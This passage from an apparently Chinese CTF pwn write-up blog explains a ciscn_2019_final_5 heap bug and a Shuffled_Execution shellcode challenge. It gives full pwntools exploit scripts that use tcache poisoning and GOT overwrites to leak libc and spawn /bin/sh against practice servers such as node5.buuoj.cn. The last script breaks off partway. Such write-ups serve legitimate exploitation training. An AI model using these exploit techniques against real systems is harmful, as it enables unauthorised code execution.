<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token string">'b *0x08048851'</span><span class="token punctuation">)</span>
backdoor<span class="token operator">=</span><span class="token number">0x0804859B</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'How many numbers you have:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Give me your numbers'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># sh.sendlineafter('exit','3')</span>
<span class="token comment"># sh.sendlineafter('which number to change:',str(0x74))</span>
<span class="token comment"># sh.sendlineafter('new number:',str(0x9b))</span>
<span class="token comment"># sh.sendlineafter('exit','3')</span>
<span class="token comment"># sh.sendlineafter('which number to change:',str(0x75))</span>
<span class="token comment"># sh.sendlineafter('new number:',str(0x85))</span>
<span class="token comment"># sh.sendlineafter('exit','3')</span>
<span class="token comment"># sh.sendlineafter('which number to change:',str(0x76))</span>
<span class="token comment"># sh.sendlineafter('new number:',str(0x4))</span>
<span class="token comment"># sh.sendlineafter('exit','3')</span>
<span class="token comment"># sh.sendlineafter('which number to change:',str(0x77))</span>
<span class="token comment"># sh.sendlineafter('new number:',str(0x8))</span>
<span class="token comment"># sh.sendlineafter('exit','5')</span>
<span class="token comment"># pause()</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'which number to change:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'new number:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x9b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'which number to change:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'new number:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'which number to change:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'new number:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'which number to change:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'new number:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>遇到问题，多调试，调试不会骗你</p>
<h2 id="16-BUU-ciscn-2019-final-5（临界条件错误，修改got表）"><a href="#16-BUU-ciscn-2019-final-5（临界条件错误，修改got表）" class="headerlink" title="16.BUU ciscn_2019_final_5（临界条件错误，修改got表）"></a>16.BUU ciscn_2019_final_5（临界条件错误，修改got表）</h2><p>国赛final的题出的确实不错，没做出来，看了wp，记录一下，一道2.27的菜单题partial RELRO，没开PIE，说明可以更改got表</p>
<p><img src="/images/v2-3019b69b9d634eba5e3482aa840e9180_720w.png" alt="img"></p>
<p>只有add，delete和edit</p>
<p><img src="/images/v2-fb622c669105b360a959a28656e5d3a3_720w.png" alt="img"></p>
<p>add看着没什么问题，会输入index，size，content，还会给出malloc后的堆块地址后12位，但这道题的index的存储方式很特殊，有一个set_index函数，将index和堆地址进行或，再将或后的堆地址存入数组，漏洞也就在这里，index的范围是0-0x10，也就是0-16，而16的二进制是0001 0000，与16进行或的时候会有漏洞。这里对index的存储逻辑就是通过or将其放入堆地址的最低4位，<strong>因为我们分配的chunk都与0x10整除，所以最后4位都是0x0</strong>，所以通过or就可以把index存到这里，</p>
<p><img src="/images/v2-74b0eae90879f797b724b40ee01940be_720w.png" alt="img"></p>
<p><img src="/images/v2-05e51fd701112b3d4846308d99c8b85e_720w.png" alt="img"></p>
<p>delete没有漏洞，但有一个寻找index的函数，就是通过与0xf与来获得最后四位，也就是存在chunk最后四位的index。</p>
<p><img src="/images/v2-634ccc683c0f10039d5272298f0f637b_720w.png" alt="img"></p>
<p><img src="/images/v2-2bb212aaf9534073248543b6a7e04e8b_720w.png" alt="img"></p>
<p>edit也会用到这样取index</p>
<p><img src="/images/v2-a3305a4af9433ebdcf6b1c361e7842bc_720w.png" alt="img"></p>
<p>我们发现，每次第一个add的chunk的最后十二位都是0x260,0x260的二进制表示是<strong>0010 0110 0000，如果与0xf进行与的话就会成为0010 0111 0000，也就是0x270，</strong>这样就可以构造fakechunk来控制后面的chunk了，（0x6020e0存储的chunk地址的最后一个数就被视为index，从0到0xf，但0xf有边界错误）</p>
<p><img src="/images/v2-316be944a8a65ba58dfefb17ee13e3b6_720w.png" alt="img"></p>
<p><img src="/images/v2-878b1f80a0e6e5be8b9dc21fc138a75b_720w.png" alt="img"></p>
<p>这时候我们再将这两个chunk给free，可以看到红框就被我们构造为fakechunk了，这时候取出这个fakechunk，我们就可以修改大小为0xd0的chunk的fd指针了，后续的思路就是将其指向存储chunk地址的content数组，这样将其加入了tcachebin中，取出后我们就可以将got表地址写入，修改free的got地址为puts 的plt，泄露libc，再修改atoi为system，就可以getshell了（这里为了将其设定为0xd0大小是为了这样可以修改后面的sizes数组，修改了才能写入指定长度的字符，最开始没注意，一直写不了）</p>
<p><img src="/images/v2-1d8db336d965f1e0f0b488716edd6476_720w.png" alt="img"></p>
<p><img src="/images/v2-7f9bc7c9b8f38bf94a17b695206654aa_720w.png" alt="img"></p>
<p>接下来将got地址写入content数组，content数组的最后一位代表的是index，而got地址的最后一位都是0x0或0x8，所以减去或加上，让其index不相同，后面就是寻常的泄露libc，覆盖got，getshell了。</p>
<p><img src="/images/v2-138ebb448288e2be25550c89e2c0981b_720w.png" alt="img"></p>
<p><img src="/images/v2-98421bb7ca50274234095cf8b3f0fbc2_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26999</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'content: '</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">3</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'content: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
ptr<span class="token operator">=</span><span class="token number">0x6020E0</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0xc0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'bbbbb'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0xc0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0xc0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>puts_got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>atoi_got<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">17</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#还得改size</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'puts_addr'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> puts_addr<span class="token operator">-</span><span class="token number">0x809c0</span>
push_rbx <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x408750</span>
system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
setvbuf <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setvbuf'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>
<span class="token comment">#之前这里一直修改失败，因为没有改size，size为0，一个字节也edit不了</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>setvbuf<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>

<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>挺有意思的</p>
<h2 id="17-爱春秋2024网络安全联赛Shuffled-Execution（shellcode，mmap，writev，openat）"><a href="#17-爱春秋2024网络安全联赛Shuffled-Execution（shellcode，mmap，writev，openat）" class="headerlink" title="17.爱春秋2024网络安全联赛Shuffled_Execution（shellcode，mmap，writev，openat）"></a>17.爱春秋2024网络安全联赛Shuffled_Execution（shellcode，mmap，writev，openat）</h2><p>只看了一道题，当时还没做出来，mmap系统调用写错了，后面writev调用也没用过，记录一下。题目本硕就是一个明显的shellcode题，mmap在0x1337000开辟了一段空间，经过shuffle函数对我们输入的shellcode进行混淆后，jmp到0x1337000开始执行，当然，有沙箱。</p>
<p><img src="/images/v2-fa7449db8b789a39a470cfb79ae7c8d5_720w.png" alt="img"></p>
<p>一个用了srand和rand来打乱我们输入的混淆函数，传入输入的字符串和长度，通过rand来做一个字符的调换，按照题目的意思是要写一个反混淆函数来让我们输入的shellcode成功执行，用ctypes的cdll来调用libc里的srand和rand来实现，但这题出的有问题，就是在这个len这里，可以看到，这里的len是通过strlen来获取的，而strlen遇见了\x00就会截断，所以只要我们输入的shellcode在最前面有\x00，后面的shellcode就完全不受影响了</p>
<p><img src="/images/v2-8f709e7c809f290087ce09ef3d5a309d_720w.png" alt="img"></p>
<p><img src="/images/v2-21de082f7393e040d28092167dc9c09a_720w.png" alt="img"></p>
<p>所以直接写shellcode就完事了，前面加一个mov rax, 0x0，就可以绕过他的混淆了，这题禁用了挺多的，但可以用的也挺多的，这里选用openat,mmap,writev来进行orw，先直接给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

<span class="token comment">#写的反混淆，没用了</span>
srand<span class="token operator">=</span>libc<span class="token punctuation">.</span>srand
rand <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand
SEED <span class="token operator">=</span> <span class="token number">0x1337</span>
<span class="token keyword">def</span> <span class="token function">reverse_shuffle</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    original<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    code_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    srand<span class="token punctuation">(</span>SEED<span class="token punctuation">)</span>
    <span class="token comment"># 创建一个数组记录索引交换历史</span>
    indices <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>code_len<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 记录每次的随机索引</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>code_len <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> code_len
        indices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j

    <span class="token comment"># 逆向重排</span>
